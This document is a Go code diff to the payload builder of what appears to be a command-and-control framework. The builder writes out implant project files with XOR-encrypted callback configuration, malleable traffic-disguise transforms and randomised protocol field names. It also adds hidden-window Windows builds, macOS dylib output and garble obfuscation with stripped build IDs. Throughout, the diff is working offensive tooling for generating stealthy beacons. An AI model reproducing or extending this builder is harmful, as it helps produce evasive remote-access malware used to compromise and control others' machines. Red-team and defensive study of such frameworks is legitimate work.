@@ -21,6 +21,7 @@ import (
 	"math"
 	"math/big"
 	"os"
+	"sort"
 	"strings"
 	"time"
 
@@ -266,6 +267,7 @@ func (b *Builder) buildPayloadAsync(ctx context.Context, req PayloadRequest, cli
 			"EXPORT_PROJECT=TRUE",
 			fmt.Sprintf("OS=%s", strings.ToLower(buildData.os)),
 			fmt.Sprintf("PROJECT_ID=%s", buildData.clientID),
+			fmt.Sprintf("PAYLOAD_TYPE=%s", buildData.payloadType),
 			fmt.Sprintf("OUTPUT_FILENAME=%s_project.zip", strings.TrimSuffix(buildData.binaryName, ".exe")),
 		}
 
@@ -389,19 +391,36 @@ func (b *Builder) writeProjectFiles(data *buildData, payloadConfig *PayloadConfi
 	if err != nil {
 		log.Printf("[Builder] Warning: Failed to load malleable config: %v", err)
 	}
-	rekeyCommand := "rekey_required" // Default
+	rekeyCommand := "rekey_required"
+	rekeyStatusField := "status"
+	rekeyDataField := "data"
+	rekeyIDField := "command_db_id"
 
-	// Check if listener has a bound server response profile
 	if b.listener.ServerResponseProfile != "" && b.agentConfig != nil {
 		responseProfile := b.agentConfig.GetServerResponseProfile(b.listener.ServerResponseProfile)
-		if responseProfile != nil && responseProfile.RekeyValue != "" {
-			rekeyCommand = responseProfile.RekeyValue
-			log.Printf("[Builder] Using server response profile %q rekey command: %q",
-				b.listener.ServerResponseProfile, rekeyCommand)
+		if responseProfile != nil {
+			if responseProfile.RekeyValue != "" {
+				rekeyCommand = responseProfile.RekeyValue
+			}
+			if responseProfile.StatusField != "" {
+				rekeyStatusField = responseProfile.StatusField
+			}
+			if responseProfile.DataField != "" {
+				rekeyDataField = responseProfile.DataField
+			}
+			if responseProfile.CommandIDField != "" {
+				rekeyIDField = responseProfile.CommandIDField
+			}
+			log.Printf("[Builder] Project export using server response profile %q - rekey: %q, fields: {%s, %s, %s}",
+				b.listener.ServerResponseProfile, rekeyCommand, rekeyStatusField, rekeyDataField, rekeyIDField)
 		}
 	} else if malleableConfig != nil {
-		rekeyCommand = malleableConfig.GetRekeyCommand()
-		log.Printf("[Builder] Using malleable rekey command: %q", rekeyCommand)
+		rekeyCommand = malleableConfig.RekeyCommand
+		rekeyStatusField = malleableConfig.RekeyStatusField
+		rekeyDataField = malleableConfig.RekeyDataField
+		rekeyIDField = malleableConfig.RekeyIDField
+		log.Printf("[Builder] Project export using malleable rekey - command: %q, fields: {%s, %s, %s}",
+			rekeyCommand, rekeyStatusField, rekeyDataField, rekeyIDField)
 	}
 
 	// Prepare custom headers JSON
@@ -412,14 +431,13 @@ func (b *Builder) writeProjectFiles(data *buildData, payloadConfig *PayloadConfi
 	headersJSON, _ := json.Marshal(customHeaders)
 
 	// Extract GET handler details - use bound profile if available
-	getMethod := "GET" // Default
+	getMethod := "GET"
 	var getRoute string
 	var getClientIDParam struct {
 		Name   string
 		Format string
 	}
 
-	// Check if listener has a bound GET profile
 	if b.listener.GetProfile != "" && b.agentConfig != nil {
 		getProfile := b.agentConfig.GetGetProfile(b.listener.GetProfile)
 		if getProfile != nil {
@@ -439,7 +457,6 @@ func (b *Builder) writeProjectFiles(data *buildData, payloadConfig *PayloadConfi
 		}
 	}
 
-	// Fallback to global routes if no profile matched
 	if getRoute == "" {
 		for _, handler := range payloadConfig.HTTPRoutes.GetHandlers {
 			if handler.Enabled {
@@ -460,7 +477,7 @@ func (b *Builder) writeProjectFiles(data *buildData, payloadConfig *PayloadConfi
 	}
 
 	// Extract POST handler details - use bound profile if available
-	postMethod := "POST" // Default
+	postMethod := "POST"
 	var postRoute string
 	var postClientIDParam struct {
 		Name   string
@@ -471,7 +488,6 @@ func (b *Builder) writeProjectFiles(data *buildData, payloadConfig *PayloadConfi
 		Format string
 	}
 
-	// Check if listener has a bound POST profile
 	if b.listener.PostProfile != "" && b.agentConfig != nil {
 		postProfile := b.agentConfig.GetPostProfile(b.listener.PostProfile)
 		if postProfile != nil {
@@ -494,7 +510,6 @@ func (b *Builder) writeProjectFiles(data *buildData, payloadConfig *PayloadConfi
 		}
 	}
 
-	// Fallback to global routes if no profile matched
 	if postRoute == "" {
 		for _, handler := range payloadConfig.HTTPRoutes.PostHandlers {
 			if handler.Enabled {
@@ -521,390 +536,386 @@ func (b *Builder) writeProjectFiles(data *buildData, payloadConfig *PayloadConfi
 	log.Printf("Project export with profiles: GET=%s, POST=%s, Response=%s",
 		b.listener.GetProfile, b.listener.PostProfile, b.listener.ServerResponseProfile)
 
-	// Values that should be encrypted (matching prepareBuildEnvironment)
-	encryptedValues := map[string]string{
-		"publicKey":          data.keyPair.PublicKeyPEM,
-		"secret":             data.secret,
-		"protocol":           b.listener.Protocol,
-		"ip":                 b.listener.IP,
-		"port":               fmt.Sprintf("%d", b.listener.Port),
-		"getMethod":          getMethod,
-		"postMethod":         postMethod,
-		"userAgent":          payloadConfig.PayloadConfig.HTTPHeaders.UserAgent,
-		"contentType":        payloadConfig.PayloadConfig.HTTPHeaders.ContentType,
-		"customHeaders":      string(headersJSON),
-		"getRoute":           getRoute,
-		"postRoute":          postRoute,
-		"getClientIDName":    getClientIDParam.Name,
-		"getClientIDFormat":  getClientIDParam.Format,
-		"postClientIDName":   postClientIDParam.Name,
-		"postClientIDFormat": postClientIDParam.Format,
-		"postSecretName":     secretParam.Name,
-		"postSecretFormat":   secretParam.Format,
+	// Serialize transform DataBlocks from profiles (same as prepareBuildEnvironment)
+	var getClientIDTransforms, postClientIDTransforms, postDataTransforms, responseDataTransforms string
+
+	if b.listener.GetProfile != "" && b.agentConfig != nil {
+		if getProfile := b.agentConfig.GetGetProfile(b.listener.GetProfile); getProfile != nil {
+			if getProfile.ClientID != nil {
+				getClientIDTransforms = SerializeDataBlockCompact(getProfile.ClientID)
+			}
+		}
 	}
 
-	// Encrypt all values including the methods
+	if b.listener.PostProfile != "" && b.agentConfig != nil {
+		if postProfile := b.agentConfig.GetPostProfile(b.listener.PostProfile); postProfile != nil {
+			if postProfile.ClientID != nil {
+				postClientIDTransforms = SerializeDataBlockCompact(postProfile.ClientID)
+			}
+			if postProfile.Data != nil {
+				postDataTransforms = SerializeDataBlockCompact(postProfile.Data)
+			}
+		}
+	}
+
+	if b.listener.ServerResponseProfile != "" && b.agentConfig != nil {
+		if respProfile := b.agentConfig.GetServerResponseProfile(b.listener.ServerResponseProfile); respProfile != nil {
+			if respProfile.Data != nil {
+				responseDataTransforms = SerializeDataBlockCompact(respProfile.Data)
+			}
+		}
+	}
+
+	// Extract padding header names from profiles
+	padPreHeader := "X-Cache-Seq"
+	padAppHeader := "X-Cache-Idx"
+	if b.listener.PostProfile != "" && b.agentConfig != nil {
+		if pp := b.agentConfig.GetPostProfile(b.listener.PostProfile); pp != nil {
+			if pp.PadPreHeader != "" {
+				padPreHeader = pp.PadPreHeader
+			}
+			if pp.PadAppHeader != "" {
+				padAppHeader = pp.PadAppHeader
+			}
+		}
+	}
+
+	// Generate random JSON field names for this build
+	jsonFields, err := GenerateJSONFieldNames()
+	if err != nil {
+		return fmt.Errorf("failed to generate JSON field names: %v", err)
+	}
+
+	// Load link malleable config
+	linkMalleable, linkErr := config.GetLinkMalleable()
+	if linkErr != nil {
+		log.Printf("[Builder] Warning: Failed to load link config, using defaults: %v", linkErr)
+	}
+
+	// Build encrypted values map (matching prepareBuildEnvironment for HTTP payloads)
+	encryptedValues := map[string]string{
+		"publicKey":              data.keyPair.PublicKeyPEM,
+		"secret":                 data.secret,
+		"protocol":               b.listener.Protocol,
+		"ip":                     b.listener.IP,
+		"port":                   fmt.Sprintf("%d", b.listener.Port),
+		"getMethod":              getMethod,
+		"postMethod":             postMethod,
+		"userAgent":              payloadConfig.PayloadConfig.HTTPHeaders.UserAgent,
+		"contentType":            payloadConfig.PayloadConfig.HTTPHeaders.ContentType,
+		"customHeaders":          string(headersJSON),
+		"getRoute":               getRoute,
+		"postRoute":              postRoute,
+		"getClientIDName":        getClientIDParam.Name,
+		"getClientIDFormat":      getClientIDParam.Format,
+		"postClientIDName":       postClientIDParam.Name,
+		"postClientIDFormat":     postClientIDParam.Format,
+		"postSecretName":         secretParam.Name,
+		"postSecretFormat":       secretParam.Format,
+		"getClientIDTransforms":  getClientIDTransforms,
+		"postClientIDTransforms": postClientIDTransforms,
+		"postDataTransforms":     postDataTransforms,
+		"responseDataTransforms": responseDataTransforms,
+		"geMethodGet":            "GET",
+		"geMethodPost":           "POST",
+		"geProtoHttps":           "https",
+		"geProtoHttp":            "http",
+		"gePort443":              "443",
+		"gePort80":               "80",
+		"geFmtUrlNoPort":         "%s://%s",
+		"geFmtUrlWithPort":       "%s://%s:%s",
+		"geFmtUrlQuery":          "%s%s?%s=%s",
+		"geSlash":                "/",
+		"httpHeaderUserAgent":    "User-Agent",
+		"httpHeaderContentType":  "Content-Type",
+		"httpHeaderPadPre":       padPreHeader,
+		"httpHeaderPadApp":       padAppHeader,
+		"httpMetaId":             "id",
+		"httpMetaEncryption":     "encryption",
+		"httpEncRsaAes":          "rsa+aes",
+	}
+
+	// Add JSON field names (env key -> Go var name mapping)
+	jfKeyToVar := map[string]string{
+		"JF_CT": "jfCT", "JF_CO": "jfCO", "JF_CI": "jfCI", "JF_CB": "jfCB",
+		"JF_AI": "jfAI", "JF_FN": "jfFN", "JF_OF": "jfOF", "JF_RP": "jfRP",
+		"JF_CC": "jfCC", "JF_TC": "jfTC", "JF_DA": "jfDA", "JF_AR": "jfAR",
+		"JF_TS": "jfTS", "JF_JI": "jfJI", "JF_OU": "jfOU", "JF_EC": "jfEC",
+		"JF_ER": "jfER", "JF_V": "jfV", "JF_T": "jfT", "JF_TPL": "jfTPL",
+		"JF_P": "jfP", "JF_BD": "jfBD", "JF_CD": "jfCD", "JF_ST": "jfST",
+		"JF_NC": "jfNC", "JF_SI": "jfSI", "JF_SG": "jfSG", "JF_SD": "jfSD",
+		"JF_CT2": "jfCT2", "JF_ET": "jfET", "JF_MD": "jfMD",
+	}
+	for envKey, value := range jsonFields {
+		if goVar, ok := jfKeyToVar[envKey]; ok {
+			encryptedValues[goVar] = value
+		}
+	}
+
+	// Encrypt all values
 	for k, v := range encryptedValues {
 		encryptedValues[k] = xorEncrypt(v, data.xorKey)
 	}
 
-	// Build safety check comment for documentation
-	safetyCheckComment := ""
-	if data.safetyChecks.Hostname != "" || data.safetyChecks.Username != "" ||
-		data.safetyChecks.Domain != "" || data.safetyChecks.FileCheck != nil ||
-		data.safetyChecks.Process != "" || data.safetyChecks.KillDate != "" ||
-		data.safetyChecks.WorkingHours != nil {
-		safetyCheckComment = "\n// Safety Checks Configured:"
-		if data.safetyChecks.Hostname != "" {
-			safetyCheckComment += fmt.Sprintf("\n// - Hostname: %s", data.safetyChecks.Hostname)
-		}
-		if data.safetyChecks.Username != "" {
-			safetyCheckComment += fmt.Sprintf("\n// - Username: %s", data.safetyChecks.Username)
-		}
-		if data.safetyChecks.Domain != "" {
-			safetyCheckComment += fmt.Sprintf("\n// - Domain: %s", data.safetyChecks.Domain)
-		}
-		if data.safetyChecks.FileCheck != nil {
-			safetyCheckComment += fmt.Sprintf("\n// - File: %s (must_exist: %v)",
-				data.safetyChecks.FileCheck.Path, data.safetyChecks.FileCheck.MustExist)
-		}
-		if data.safetyChecks.Process != "" {
-			safetyCheckComment += fmt.Sprintf("\n// - Process: %s", data.safetyChecks.Process)
-		}
-		if data.safetyChecks.KillDate != "" {
-			safetyCheckComment += fmt.Sprintf("\n// - Kill Date: %s", data.safetyChecks.KillDate)
-		}
-		if data.safetyChecks.WorkingHours != nil {
-			safetyCheckComment += fmt.Sprintf("\n// - Working Hours: %s - %s",
-				data.safetyChecks.WorkingHours.Start, data.safetyChecks.WorkingHours.End)
-		}
+	// Build _init_variables.go content — only init(), no var declarations
+	var initBuf strings.Builder
+	initBuf.WriteString("package main\n\nfunc init() {\n")
+
+	// Non-encrypted values
+	fmt.Fprintf(&initBuf, "\tcfgKey = %q\n", data.xorKey)
+	fmt.Fprintf(&initBuf, "\tclientID = %q\n", data.clientID.String())
+	fmt.Fprintf(&initBuf, "\tsleep = %q\n", fmt.Sprintf("%d", payloadConfig.PayloadConfig.Sleep))
+	fmt.Fprintf(&initBuf, "\tjitter = %q\n", fmt.Sprintf("%d", payloadConfig.PayloadConfig.Jitter))
+
+	// All encrypted config values
+	sortedKeys := make([]string, 0, len(encryptedValues))
+	for k := range encryptedValues {
+		sortedKeys = append(sortedKeys, k)
+	}
+	sort.Strings(sortedKeys)
+	for _, k := range sortedKeys {
+		fmt.Fprintf(&initBuf, "\t%s = %q\n", k, encryptedValues[k])
 	}
 
-	// Create init_variables.go with safety checks included
-	initContent := fmt.Sprintf(`package main
+	// Malleable rekey fields (plain text, not encrypted — agent reads directly)
+	fmt.Fprintf(&initBuf, "\tMALLEABLE_REKEY_COMMAND = %q\n", rekeyCommand)
+	fmt.Fprintf(&initBuf, "\tMALLEABLE_REKEY_STATUS_FIELD = %q\n", rekeyStatusField)
+	fmt.Fprintf(&initBuf, "\tMALLEABLE_REKEY_DATA_FIELD = %q\n", rekeyDataField)
+	fmt.Fprintf(&initBuf, "\tMALLEABLE_REKEY_ID_FIELD = %q\n", rekeyIDField)
 
-// Auto-generated for project export
-// Generated: %s
-// Target: %s/%s
-// HTTP Methods: GET=%s, POST=%s%s
-// XOR Key is embedded for decryption at runtime
+	// Malleable link fields
+	fmt.Fprintf(&initBuf, "\tMALLEABLE_LINK_DATA_FIELD = %q\n", linkMalleable.LinkDataField)
+	fmt.Fprintf(&initBuf, "\tMALLEABLE_LINK_COMMANDS_FIELD = %q\n", linkMalleable.LinkCommandsField)
+	fmt.Fprintf(&initBuf, "\tMALLEABLE_LINK_HANDSHAKE_FIELD = %q\n", linkMalleable.LinkHandshakeField)
+	fmt.Fprintf(&initBuf, "\tMALLEABLE_LINK_HANDSHAKE_RESP_FIELD = %q\n", linkMalleable.LinkHandshakeResponseField)
+	fmt.Fprintf(&initBuf, "\tMALLEABLE_LINK_UNLINK_FIELD = %q\n", linkMalleable.LinkUnlinkField)
+	fmt.Fprintf(&initBuf, "\tMALLEABLE_ROUTING_ID_FIELD = %q\n", linkMalleable.RoutingIDField)
+	fmt.Fprintf(&initBuf, "\tMALLEABLE_PAYLOAD_FIELD = %q\n", linkMalleable.PayloadField)
 
-// Declare variables that will be set
-var (
-	// Non-encrypted values
-	xorKey   string
-	clientID string
-	sleep    string
-	jitter   string
-
-	// Encrypted values
-	getMethod          string
-	postMethod         string
-	userAgent          string
-	contentType        string
-	customHeaders      string
-	getRoute           string
-	postRoute          string
-	getClientIDName    string
-	getClientIDFormat  string
-	postClientIDName   string
-	postClientIDFormat string
-	postSecretName     string
-	postSecretFormat   string
-	publicKey          string
-	secret             string
-	protocol           string
-	ip                 string
-	port               string
-
-	// Safety check variables
-	safetyHostname       string = "%s"
-	safetyUsername       string = "%s"
-	safetyDomain         string = "%s"
-	safetyFilePath       string = "%s"
-	safetyFileMustExist  string = "%s"
-	safetyProcess        string = "%s"
-	safetyKillDate       string = "%s"
-	safetyWorkHoursStart string = "%s"
-	safetyWorkHoursEnd   string = "%s"
-
-	// Toggle variables
-	toggleCheckEnvironment     string
-	toggleCheckTimeDiscrepancy string
-	toggleCheckMemoryPatterns  string
-	toggleCheckParentProcess   string
-	toggleCheckLoadedLibraries string
-	toggleCheckDockerContainer string
-	toggleCheckProcessList     string
-)
-
-func init() {
-	// Set non-encrypted values
-	xorKey = "%s"
-	clientID = "%s"
-	sleep = "%d"
-	jitter = "%d"
-	
-	// Set encrypted values (these are XOR encrypted and base64 encoded)
-	getMethod = "%s"
-	postMethod = "%s"
-	userAgent = "%s"
-	contentType = "%s"
-	customHeaders = "%s"
-	getRoute = "%s"
-	postRoute = "%s"
-	getClientIDName = "%s"
-	getClientIDFormat = "%s"
-	postClientIDName = "%s"
-	postClientIDFormat = "%s"
-	postSecretName = "%s"
-	postSecretFormat = "%s"
-	publicKey = "%s"
-	secret = "%s"
-	protocol = "%s"
-	ip = "%s"
-	port = "%s"
-}
-`,
-		time.Now().Format(time.RFC3339),
-		data.os, data.arch,
-		getMethod, postMethod,
-		safetyCheckComment,
-		// Safety check values (XOR encrypted for memory protection)
-		func() string {
+	// Safety check values (only set non-empty)
+	safetyVals := map[string]string{
+		"safetyHostname": func() string {
 			if data.safetyChecks.Hostname == "" {
 				return ""
 			}
 			return xorEncrypt(data.safetyChecks.Hostname, data.xorKey)
 		}(),
-		func() string {
+		"safetyUsername": func() string {
 			if data.safetyChecks.Username == "" {
 				return ""
 			}
 			return xorEncrypt(data.safetyChecks.Username, data.xorKey)
 		}(),
-		func() string {
+		"safetyDomain": func() string {
 			if data.safetyChecks.Domain == "" {
 				return ""
 			}
 			return xorEncrypt(data.safetyChecks.Domain, data.xorKey)
 		}(),
-		func() string {
+		"safetyFilePath": func() string {
 			if data.safetyChecks.FileCheck != nil && data.safetyChecks.FileCheck.Path != "" {
 				return xorEncrypt(data.safetyChecks.FileCheck.Path, data.xorKey)
 			}
 			return ""
 		}(),
-		func() string {
+		"safetyFileMustExist": func() string {
 			if data.safetyChecks.FileCheck != nil && data.safetyChecks.FileCheck.MustExist {
 				return xorEncrypt("true", data.xorKey)
 			}
 			return xorEncrypt("false", data.xorKey)
 		}(),
-		func() string {
+		"safetyProcess": func() string {
 			if data.safetyChecks.Process == "" {
 				return ""
 			}
 			return xorEncrypt(data.safetyChecks.Process, data.xorKey)
 		}(),
-		func() string {
+		"safetyKillDate": func() string {
 			if data.safetyChecks.KillDate == "" {
 				return ""
 			}
 			return xorEncrypt(data.safetyChecks.KillDate, data.xorKey)
 		}(),
-		func() string {
+		"safetyWorkHoursStart": func() string {
 			if data.safetyChecks.WorkingHours != nil && data.safetyChecks.WorkingHours.Start != "" {
 				return xorEncrypt(data.safetyChecks.WorkingHours.Start, data.xorKey)
 			}
 			return ""
 		}(),
-		func() string {
+		"safetyWorkHoursEnd": func() string {
 			if data.safetyChecks.WorkingHours != nil && data.safetyChecks.WorkingHours.End != "" {
 				return xorEncrypt(data.safetyChecks.WorkingHours.End, data.xorKey)
 			}
 			return ""
 		}(),
-		// Regular values
-		data.xorKey,
-		data.clientID,
-		payloadConfig.PayloadConfig.Sleep,
-		payloadConfig.PayloadConfig.Jitter,
-		encryptedValues["getMethod"],
-		encryptedValues["postMethod"],
-		encryptedValues["userAgent"],
-		encryptedValues["contentType"],
-		encryptedValues["customHeaders"],
-		encryptedValues["getRoute"],
-		encryptedValues["postRoute"],
-		encryptedValues["getClientIDName"],
-		encryptedValues["getClientIDFormat"],
-		encryptedValues["postClientIDName"],
-		encryptedValues["postClientIDFormat"],
-		encryptedValues["postSecretName"],
-		encryptedValues["postSecretFormat"],
-		encryptedValues["publicKey"],
-		encryptedValues["secret"],
-		encryptedValues["protocol"],
-		encryptedValues["ip"],
-		encryptedValues["port"],
-	)
+	}
+	safetyKeys := []string{"safetyHostname", "safetyUsername", "safetyDomain", "safetyFilePath",
+		"safetyFileMustExist", "safetyProcess", "safetyKillDate", "safetyWorkHoursStart", "safetyWorkHoursEnd"}
+	for _, k := range safetyKeys {
+		if v := safetyVals[k]; v != "" {
+			fmt.Fprintf(&initBuf, "\t%s = %q\n", k, v)
+		}
+	}
 
-	// Write init_variables.go
+	initBuf.WriteString("}\n")
+	initContent := initBuf.String()
+
 	if err := os.WriteFile(fmt.Sprintf("/shared/%s_init_variables.go", data.clientID), []byte(initContent), 0644); err != nil {
 		return err
 	}
 
-	// Determine binary extension
+	// Determine binary extension and build flags for features/format
 	binaryExt := ""
 	if data.os == "windows" {
 		binaryExt = ".exe"
+	} else if data.os == "darwin" && data.format == "dylib" {
+		binaryExt = ".dylib"
 	}
 
-	// Create build script with note about custom methods and safety checks
+	buildTags := ""
+	if len(data.features) > 0 {
+		tagList := "feature_modular"
+		for _, feat := range data.features {
+			feat = strings.TrimSpace(feat)
+			if feat != "" {
+				tagList += ",feature_" + feat
+			}
+		}
+		buildTags = tagList
+	}
+
+	if data.format == "dylib" && data.os == "darwin" {
+		if buildTags != "" {
+			buildTags += ",build_dylib"
+		} else {
+			buildTags = "build_dylib"
+		}
+	}
+
+	buildTagsFlag := ""
+	if buildTags != "" {
+		buildTagsFlag = "-tags " + buildTags
+	}
+
+	isDylib := data.format == "dylib" && data.os == "darwin"
+
+	windowsSubsystem := ""
+	if data.os == "windows" {
+		windowsSubsystem = "-H windowsgui "
+	}
+
+	buildmodeFlag := ""
+	if isDylib {
+		buildmodeFlag = "-buildmode=c-shared "
+	}
+
+	// Build script
 	buildScriptContent := fmt.Sprintf(`#!/bin/bash
-# Build script for payload - matches production build settings
-# Target: %s/%s
-# HTTP Methods: GET=%s, POST=%s
-# Generated: %s
-%s
+set -e
 
 OUTPUT_NAME="payload_%s_%s%s"
 if [ "$1" != "" ]; then
     OUTPUT_NAME="$1"
 fi
+`, data.os, data.arch, binaryExt)
 
-echo "Building for %s/%s..."
-echo "Using HTTP methods: GET=%s, POST=%s"
-echo "Malleable rekey command: %s"
+	if isDylib {
+		zigTarget := "x86_64-macos"
+		if data.arch == "arm64" {
+			zigTarget = "aarch64-macos"
+		}
+		buildScriptContent += fmt.Sprintf(`
+export CGO_ENABLED=1
+export CC="zig cc -target %s"
+`, zigTarget)
+	}
 
-# Check if garble is installed
+	buildScriptContent += fmt.Sprintf(`
+LDFLAGS="%s-w -s -buildid="
+
 if ! command -v garble &> /dev/null; then
-    echo "Warning: garble not found, building without obfuscation"
-    GOOS=%s GOARCH=%s go build \
-        -ldflags="-w -s -buildid= -X 'main.MALLEABLE_REKEY_COMMAND=%s'" \
+    GOOS=%s GOARCH=%s go build %s%s\
+        -ldflags="${LDFLAGS}" \
         -trimpath \
         -o "${OUTPUT_NAME}" \
         *.go
 else
-    echo "Building with garble obfuscation..."
-    GOOS=%s GOARCH=%s garble -seed=random -literals -tiny -debugdir=none build \
-        -ldflags="-w -s -buildid= -X 'main.MALLEABLE_REKEY_COMMAND=%s'" \
+    GOOS=%s GOARCH=%s garble -seed=random -literals -tiny build %s%s\
+        -ldflags="${LDFLAGS}" \
         -trimpath \
         -o "${OUTPUT_NAME}" \
         *.go
 fi
 
-if [ $? -eq 0 ]; then
-    echo "Build successful: ${OUTPUT_NAME}"
-    ls -lh "${OUTPUT_NAME}"
-else
-    echo "Build failed"
-    exit 1
-fi
+echo "Build successful: ${OUTPUT_NAME}"
+ls -lh "${OUTPUT_NAME}"
 `,
-		data.os, data.arch,
-		getMethod, postMethod,
-		time.Now().Format(time.RFC3339),
-		strings.ReplaceAll(safetyCheckComment, "// ", "# "),
-		data.os, data.arch, binaryExt,
-		data.os, data.arch,
-		getMethod, postMethod,
-		rekeyCommand,
-		data.os, data.arch,
-		rekeyCommand,
-		data.os, data.arch,
-		rekeyCommand,
+		windowsSubsystem,
+		data.os, data.arch, buildmodeFlag, buildTagsFlag,
+		data.os, data.arch, buildmodeFlag, buildTagsFlag,
 	)
 
 	if err := os.WriteFile(fmt.Sprintf("/shared/%s_build.sh", data.clientID), []byte(buildScriptContent), 0755); err != nil {
 		return err
 	}
 
-	// Create Makefile with custom methods and safety checks noted
-	makefileContent := fmt.Sprintf(`# Makefile for payload project
-# Target: %s/%s
-# HTTP Methods: GET=%s, POST=%s
-# Malleable Rekey Command: %s
-%s
-
-BINARY_NAME = payload_%s_%s%s
+	// Makefile
+	makefileContent := fmt.Sprintf(`BINARY_NAME = payload_%s_%s%s
 GOOS = %s
 GOARCH = %s
-LDFLAGS = -w -s -buildid= -X 'main.MALLEABLE_REKEY_COMMAND=%s'
-GARBLE_FLAGS = -seed=random -literals -tiny -debugdir=none
+LDFLAGS = %s-w -s -buildid=
+GARBLE_FLAGS = -seed=random -literals -tiny
+BUILD_FLAGS = %s%s
+`, data.os, data.arch, binaryExt,
+		data.os, data.arch,
+		windowsSubsystem,
+		buildmodeFlag, buildTagsFlag)
 
-.PHONY: all build build-garble clean info
+	if isDylib {
+		zigTarget := "x86_64-macos"
+		if data.arch == "arm64" {
+			zigTarget = "aarch64-macos"
+		}
+		makefileContent += fmt.Sprintf(`CGO_SETUP = CGO_ENABLED=1 CC="zig cc -target %s"
+`, zigTarget)
+	} else {
+		makefileContent += `CGO_SETUP =
+`
+	}
+
+	makefileContent += `
+.PHONY: all build build-garble clean
 
 all: build
 
-info:
-	@echo "Build configuration:"
-	@echo "  Target OS: $(GOOS)"
-	@echo "  Target Arch: $(GOARCH)"
-	@echo "  GET Method: %s"
-	@echo "  POST Method: %s"
-
-# Standard build without obfuscation
 build:
-	GOOS=$(GOOS) GOARCH=$(GOARCH) go build -ldflags="$(LDFLAGS)" -trimpath -o $(BINARY_NAME) *.go
+	$(CGO_SETUP) GOOS=$(GOOS) GOARCH=$(GOARCH) go build $(BUILD_FLAGS) -ldflags="$(LDFLAGS)" -trimpath -o $(BINARY_NAME) *.go
 
-# Build with garble obfuscation
 build-garble:
-	GOOS=$(GOOS) GOARCH=$(GOARCH) garble $(GARBLE_FLAGS) build -ldflags="$(LDFLAGS)" -trimpath -o $(BINARY_NAME) *.go
+	$(CGO_SETUP) GOOS=$(GOOS) GOARCH=$(GOARCH) garble $(GARBLE_FLAGS) build $(BUILD_FLAGS) -ldflags="$(LDFLAGS)" -trimpath -o $(BINARY_NAME) *.go
 
 clean:
-	rm -f $(BINARY_NAME) $(BINARY_NAME).exe
-
-help:
-	@echo "Available targets:"
-	@echo "  make info          - Show build configuration"
-	@echo "  make build         - Build without obfuscation"
-	@echo "  make build-garble  - Build with garble obfuscation"
-	@echo "  make clean         - Remove built binaries"
-`,
-		data.os, data.arch,
-		getMethod, postMethod,
-		rekeyCommand,
-		strings.ReplaceAll(safetyCheckComment, "// ", "# "),
-		data.os, data.arch, binaryExt,
-		data.os, data.arch,
-		rekeyCommand,
-		getMethod, postMethod,
-	)
+	rm -f $(BINARY_NAME)
+`
 
 	if err := os.WriteFile(fmt.Sprintf("/shared/%s_Makefile", data.clientID), []byte(makefileContent), 0644); err != nil {
 		return err
 	}
 
-	// Windows batch file if target is Windows
+	// Windows batch file
 	if data.os == "windows" {
 		buildBatContent := fmt.Sprintf(`@echo off
-REM Build script for Windows payload
-REM Target: %s/%s
-REM HTTP Methods: GET=%s, POST=%s
-REM Malleable Rekey Command: %s
-%s
-
 set OUTPUT_NAME=payload_%s_%s.exe
 if NOT "%%1"=="" set OUTPUT_NAME=%%1
 
-echo Building for %s/%s...
-echo Using HTTP methods: GET=%s, POST=%s
-echo Malleable rekey command: %s
+set GOOS=%s
+set GOARCH=%s
 
-REM Check if garble exists
 where garble >nul 2>nul
 if %%ERRORLEVEL%% NEQ 0 (
-    echo Warning: garble not found, building without obfuscation
-    set GOOS=%s
-    set GOARCH=%s
-    go build -ldflags="-w -s -buildid= -X 'main.MALLEABLE_REKEY_COMMAND=%s'" -trimpath -o "%%OUTPUT_NAME%%" *.go
+    go build %s-ldflags="-H windowsgui -w -s -buildid=" -trimpath -o "%%OUTPUT_NAME%%" *.go
 ) else (
-    echo Building with garble obfuscation...
-    set GOOS=%s
-    set GOARCH=%s
-    garble -seed=random -literals -tiny -debugdir=none build -ldflags="-w -s -buildid= -X 'main.MALLEABLE_REKEY_COMMAND=%s'" -trimpath -o "%%OUTPUT_NAME%%" *.go
+    garble -seed=random -literals -tiny build %s-ldflags="-H windowsgui -w -s -buildid=" -trimpath -o "%%OUTPUT_NAME%%" *.go
 )
 
 if %%errorlevel%% equ 0 (
@@ -916,17 +927,8 @@ if %%errorlevel%% equ 0 (
 )
 `,
 			data.os, data.arch,
-			getMethod, postMethod,
-			rekeyCommand,
-			strings.ReplaceAll(safetyCheckComment, "// ", "REM "),
 			data.os, data.arch,
-			data.os, data.arch,
-			getMethod, postMethod,
-			rekeyCommand,
-			data.os, data.arch,
-			rekeyCommand,
-			data.os, data.arch,
-			rekeyCommand,
+			buildTagsFlag+" ", buildTagsFlag+" ",
 		)
 
 		if err := os.WriteFile(fmt.Sprintf("/shared/%s_build.bat", data.clientID), []byte(buildBatContent), 0644); err != nil {
